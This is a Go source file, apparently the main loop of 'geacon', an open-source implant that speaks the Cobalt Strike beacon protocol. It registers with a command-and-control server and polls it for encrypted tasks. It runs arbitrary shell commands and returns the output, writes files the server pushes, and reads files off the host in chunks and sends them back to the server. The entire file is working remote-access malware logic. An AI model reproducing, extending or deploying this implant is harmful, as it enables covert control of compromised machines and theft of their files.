package main

import (
	"bytes"
	"fmt"
	"geacon/cmd/config"
	"geacon/cmd/crypt"
	"geacon/cmd/packet"
	"geacon/cmd/util"
	"io"
	"os"
	"time"
)



func main() {

	ok := packet.FirstBlood()
	if ok {
		for ; ;  {
			resp := packet.PullCommand()
			if resp != nil {
				totalLen := resp.Response().ContentLength
				if totalLen > 0 {
					hmacHash := resp.Bytes()[totalLen - crypt.HmacHashLen :]
					fmt.Printf("hmac hash: %v\n", hmacHash)
					//TODO check the hmachash
					restBytes := resp.Bytes()[ : totalLen - crypt.HmacHashLen]
					decrypted := packet.DecryptPacket(restBytes)
					timestamp := decrypted[:4]
					fmt.Printf("timestamp: %v\n",timestamp)
					lenBytes := decrypted[4:8]
					packetLen := packet.ReadInt(lenBytes)

					decryptedBuf := bytes.NewBuffer(decrypted[8:])
					for ; ;  {
						if packetLen <= 0 {
							break
						}
						cmdType , cmdBuf := packet.ParsePacket(decryptedBuf , &packetLen)
						if cmdBuf != nil {
							switch cmdType {
							//shell
							case packet.CMD_TYPE_SHELL:
								shellPath , shellBuf := packet.ParseCommandShell(cmdBuf)
								result := packet.Shell(shellPath,shellBuf)
								finalPaket := packet.MakePacket(0,result)
								packet.PushResult(finalPaket)

							case packet.CMD_TYPE_UPLOAD_START:
								filePath , fileData := packet.ParseCommandUpload(cmdBuf)
								packet.Upload(string(filePath),fileData)

							case packet.CMD_TYPE_UPLOAD_LOOP:
								filePath , fileData := packet.ParseCommandUpload(cmdBuf)
								packet.Upload(string(filePath),fileData)

							case packet.CMD_TYPE_DOWNLOAD:
								filePath := cmdBuf
								//TODO encode
								strFilePath := string(filePath)
								fileInfo, err := os.Stat(strFilePath)
								if err != nil {
									//TODO notify error to c2
									break
								}
								fileLen := fileInfo.Size()
								test := int(fileLen)
								fileLenBytes := packet.WriteInt(test)
								requestID := crypt.RandomInt(10000, 99999)
								requestIDBytes := packet.WriteInt(requestID)
								result := util.BytesCombine(requestIDBytes,fileLenBytes,filePath)
								finalPaket := packet.MakePacket(2,result)
								packet.PushResult(finalPaket)

								fileHandle , err := os.Open(strFilePath)
								if err != nil {
									break
								}
								var fileContent []byte
								fileBuf := make([]byte, 512 * 1024)
								for ; ;  {
									n, err := fileHandle.Read(fileBuf)
									if err != nil && err != io.EOF {
										break
									}
									if n == 0 {
										break
									}
									fileContent = fileBuf[:n]
									result = util.BytesCombine(requestIDBytes,fileContent)
									finalPaket = packet.MakePacket(8,result)
									packet.PushResult(finalPaket)
								}

								finalPaket = packet.MakePacket(9,requestIDBytes)
								packet.PushResult(finalPaket)



							case packet.CMD_TYPE_SLEEP:
								sleep := packet.ReadInt(cmdBuf[:4])
								//jitter := packet.ReadInt(cmdBuf[4:8])
								//fmt.Printf("Now sleep is %d ms, jitter is %d\n",sleep,jitter)
								config.WaitTime = time.Duration(sleep) * time.Millisecond

							default:
								errIdBytes := packet.WriteInt(0) // must be zero
								arg1Bytes := packet.WriteInt(0) // for debug
								arg2Bytes := packet.WriteInt(0)
								errMsgBytes := []byte("You are now using geacon coded by darkr4y,and he may not have implemented this feature yet cuz life is shit.")
								result := util.BytesCombine(errIdBytes,arg1Bytes,arg2Bytes,errMsgBytes)
								finalPaket := packet.MakePacket(31,result)
								packet.PushResult(finalPaket)


							}
						}
					}
				}
			}
			time.Sleep(config.WaitTime)
		}
	}

	
}
